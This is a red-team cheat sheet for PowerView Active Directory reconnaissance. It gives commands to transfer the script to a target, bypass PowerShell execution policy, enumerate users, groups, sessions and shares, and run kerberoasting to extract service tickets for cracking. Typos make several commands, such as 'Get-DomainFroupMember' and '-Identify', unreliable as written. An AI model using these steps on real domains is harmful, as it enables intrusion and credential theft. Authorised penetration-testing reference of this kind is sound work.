## PowerView - Active Directory Enumeration

*   [PowerSploit Recon Docs]()
*   [PowerSploit Github]()
  
---

### What is PowerView?

**PowerView** is a powershelll-based tool for gaining network situational awarness on windows domains

*   It acts as a **powershelll alternative** to ``net*`` commands
*   Leverages **powershelll AD hooks** and underlying **Win32 API functions** to interact with Active Directory.
*   Ideal for **reconnaissance** and **privilege escalation** during red team engagement
  
---

### Setup

1.  Download PowerView

```bash
mkdir /opt/ADtools
```

```bash
cd /opt/ADtools
```

```bash
wget https://raw.githubusercontent.com/powershelllMafia/PowerSploit/master/Recon/Powerview.ps1
```

2.  Host PowerView using python HTTP server

```bash
python3 -m http.server
```

3.  Transfer PowerViewto target Machine

```bash
powershelll (New-Object System.Net.WebClient).DownloadFile('url','PowerView.ps1')
```

4.  Execute Policy Bypass

```bash
powershelll -nop -ep bypass
```

5.  Import PowerView

To load all PowerView functions into the currentsessions:

```powershelll
Import-Module .\PowerView.ps1
```

To execute the script directly without importing the functions:

```powershelll
./PowerView.ps1
```

---

### Active Directory Enumeration

#### Domain Enumerstion

*   Get Domain info
  
```powershelll
Get-Domain
```

```powershelll
Get-NetDomain
```

*   Get domain SID

```powershelll
Get-DomainSID
```

*   Get domain controllers:

```powershelll
Get-NetDomainController
```

```powershelll
Get-DomainController
```

```powershelll
Get-Domain -Domain infosecwarrior.local
```

---

#### User Enumeration

*   List all users 
  

```powershelll
Get-NetUser
```

*  Get Abstract list of users:

```powershelll
Get-NetUser | select cn
```

* Get user principal names:

```powershelll
Get-NetUser | select userprincipalname
```

* get specific user details

```powershelll
Get-NetUser -UserName DevNull
```

* Get a list of users in the current domain

```powershelll
Get-DomainUser
```

```powershelll
Get-DomainUser -Identify DevNull
```

```powershelll
Get-DomainUser | select samaccountname
```

```powershelll
Get-DomainUser | select samaccountname,logonCount
```

* Get list of all properties for a user

```powershelll
Get-DomainUser -Identify DevNull -Properties *
```

```powershelll
Get-DomainUser -Properties samaccountname,logonCount
```

* Search a specific string in a user's attribute

```powershelll
Get-DomainUser -LDAPFilter "Description=*built*" | Select naem,Description
```

---

#### Group Enumeration

* List all group

```powershelll
Get-NetGroup
```

```powershelll
Get-NetGroup -Domain infosecwarrior.local
```

```powershelll
Get-NetGroup -AdminCount
```

* List group members

```powershelll
Get-DomainFroupMember "Domain Admins"
```

* Get group members

```powershelll
Get-NetGroupMember -GroupName "administrators"
```

* List local groups on a machine

```powershelll
Get-NetLocalGroup -ComputerName WC01
```

* Get members of a specific local group ("Administrators") on a machine

```powershelll
Get-NetLocalGroupMember -ComputerName WC01 -GroupName Administrators
```

* Get domain groups and membership

```powershelll
Get-DomainGroup
```

```powershelll
Get-DomainGroup -Domain infosecwarrior.local
```

```powershelll
Get-DomainGroup *admin* | select Name
```

```powershelll
Get-DomainGroup *admin* -Domain infosecwarrior.local | select Name
```

* Get all members of the "Domain Admins" group (including nested groups)


```powershelll
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

* Equivalent with AD client

```powershelll
Get-ADGroupMember -Identity "Domain Admins" -Recurse
```

* Get the group membership for a specifc user

```powershelll
Get-DomainGroup -UserName "DevNull"
```

* Equivalent with AD cmdlet

```powershelll
Get-ADPrincipalGroupMembership -Identity Devnull
```


---


#### Computer Enumeration

* List all computers

```powershelll
Get-NetComputer
```

```powershelll
Get-NetComputer -Ping
```

```powershelll
Get-NetComputer | select cn, operatingsystem
```

* Get a list of all computers in trhe current domain

```powershelll
Get-DomainComputer | select Name
```

```powershelll
Get-DomainComputer | select dnshostname
```

```powershelll
Get-DomainComputer | select dnshostname, logonCount 
```

```powershelll
Get-DomainComputer | select Name, dnshostname, logonCount 
```

* Get a list of all computers in the current domain

```powershelll
Get-DomainComputer | select -ExpandProperty dnshostname 
```

* Get computers running a specific OS

```powershelll
Get-DomainComputer -OperatingSystem "*Server 2022*"
```

* Ping all discovered computer 

```powershell
Get-DomainComputer -Ping
```

---

#### Advanced Group and GPO Enumeration

* Find GPO linked to a specific domain

```powershell
Get-DomainGPO -Domain infosecwarrior.local
```

* Get domain policies

```powershell
Get-DomainPolicy
```

```powershell
Get-DomainPolicyData -Policy DefaultDomainPolicy
```

```powershell
Get-DomainPolicyData -Policy DomainControllerPolicy
```

---

#### Session and Logon Enumeration

* Find localadmin access

```powershell
Find-localAdminAccess
```

* Get logged on users

```powershell
Get-NetLoggedOn -ComputerName DC01.infosecwarrior.local
```

```powershell
Get-LastLoggedOn -ComputerName DC01.infosecwarrior.local
```

```powershell
Get-NetRDPSession -ComputerName DC01.infosecwarror.local
```

```powershell
Get-LoggedOnLocal -Computername WC01
```

---

#### Network Share and File Discovery

* Find shares on hosts in current domain

```powershell
Invoke-ShareFinder -Verbose
```

* Find sensitive files on computers in the domain

```powershell
Invoke-FileFinder -Verbose
```

* Get all file servers of the domain

```powershell
Get-NetFileServer
```

---

### Attack Techniques 

#### kerberosting

Request and extract Service Principal Names (SPN) tickets for cracking

```powershell
Invoke-Kerberoast
```

#### Admin Privilege Hunting

Find local admin access

```powershell
invoke-EnumerateLocalAdmin
```

#### Network Share Discovery

identify network shares

```powershell
Invoke-ShareFinder
```

---

